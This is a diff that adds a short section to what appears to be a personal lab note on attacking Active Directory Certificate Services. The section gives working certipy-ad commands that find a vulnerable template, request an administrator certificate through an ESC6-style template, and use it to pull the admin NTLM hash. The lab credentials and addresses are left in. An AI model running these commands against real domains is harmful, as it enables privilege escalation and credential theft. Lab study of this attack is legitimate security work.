@@ -4,9 +4,24 @@
 
 #
 
-#
+# Exploitation with CERTIPY
+```powershell
+# Scan Vulnerability Template
+certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \ 
+    -dc-ip 192.168.0.150 -stdout -vulnerable
 
-#
+# Request Administrator .pfx
+certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \  
+    -dc-ip 192.168.0.150 -target 192.168.0.150 \
+    -ca 'certificate-WIN-CERTIFICATE-CA' \
+    -template 'VulnESC6' \
+    -upn 'administrator@certificate.local'
+
+# Get Admin NTLM Hash
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip 192.168.0.150
+```
+
+# 
 
 # Labaratory
 ```powershell
